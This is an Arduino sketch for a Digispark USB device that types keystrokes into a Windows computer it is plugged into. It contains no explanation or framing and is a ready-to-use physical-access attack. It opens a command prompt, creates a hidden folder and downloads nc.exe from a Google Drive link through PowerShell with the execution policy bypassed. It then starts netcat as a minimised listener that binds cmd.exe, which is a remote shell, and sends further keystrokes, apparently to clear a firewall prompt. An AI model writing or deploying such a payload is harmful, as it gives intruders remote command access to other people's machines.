#include "DigiKeyboard.h"

void setup() {
  
  DigiKeyboard.sendKeyStroke(0);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(250);

  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(375);

  DigiKeyboard.print("color fe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);

  DigiKeyboard.print("cd / & md p & attrib +h \\p & cd p & echo (wget \"https://drive.google.com/uc?export=download&id=1VUHFMTFVgVDE5d4905P8xG7O_D5U7VIx\" -OutFile nc.exe)> y.PS1 & powershell -ExecutionPolicy ByPass -File y.ps1");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
  DigiKeyboard.delay(350);
  DigiKeyboard.print("START /MIN nc.exe -Lp 100 -vv -e cmd.exe -d & exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(15000);
  DigiKeyboard.sendKeyStroke(43, MOD_ALT_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(250);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_ALT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_A, MOD_ALT_LEFT);
}

void loop() {
  // put your main code here, to run repeatedly:

}
